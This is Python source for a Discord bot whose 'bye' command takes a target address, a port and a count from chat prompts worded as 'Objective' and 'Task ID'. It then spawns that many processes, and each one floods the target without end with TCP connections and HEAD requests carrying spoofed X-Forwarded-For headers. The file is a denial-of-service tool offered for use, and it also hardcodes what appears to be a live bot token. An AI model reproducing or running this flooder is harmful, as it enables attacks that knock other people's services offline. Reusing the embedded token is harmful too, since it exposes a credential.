import requests
import discord, os, asyncio, collections, time, json, socket, multiprocessing, random, platform
from discord.ext import commands
from discord import User
from discord.ext.commands import has_permissions
bot = commands.Bot(command_prefix="bye ")

@bot.command()
async def bye(ctx):
    if ctx.channel.id != 947476218024976424:
        return
    def r():
        randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        return randip
    
    def attack():
        connection = "Connection: null\r\n"
        referer = "Referer: null\r\n"
        forward = "X-Forwarded-For: " + r() + "\r\n"
        get_host = "HEAD " + ip.content + " HTTP/1.1\r\nHost: " + ip.content + "\r\n"
        request = get_host + referer  + connection + forward + "\r\n\r\n"
        while True:
            try:
                atk = socket.socket(socket.AF_INET, socket.SOCK.STREAM)
                atk.connect((ip.content, int(port.content)))
                for y in range(1):
                    atk.send(str.encode(request))
            except socket.error:
                time.sleep(0.01)
            except:
                pass

    def check(message):
        return message.author == ctx.author and message.channel == ctx.channel
    
    await ctx.send("Send Objective:")
    ip = await bot.wait_for("message", timeout=120, check=check)
    await ctx.send("Send Task ID:")
    port = await bot.wait_for("message", timeout=120, check=check)
    await ctx.send("Send amount of requests to send:")
    amount = await bot.wait_for("message", timeout=120, check=check)

    await ctx.send("Bye bye process beginning...")
    def a():
        for i in range(int(amount.content)):
            mp = multiprocessing.Process(target=attack)
            mp.setDaemon = False
            mp.start()
    a()
    await ctx.send("Bye bye process completed!")

@bot.event
async def on_ready():
    print("ready")
    await bot.change_presence(activity=discord.Game(name="bye bye"))

bot.run("OTQ3MzMwNzM4MTE2NzU1NDY2.YhrsgA.p5zMbXOIg4lmy4KFF6uw6NgcmI4")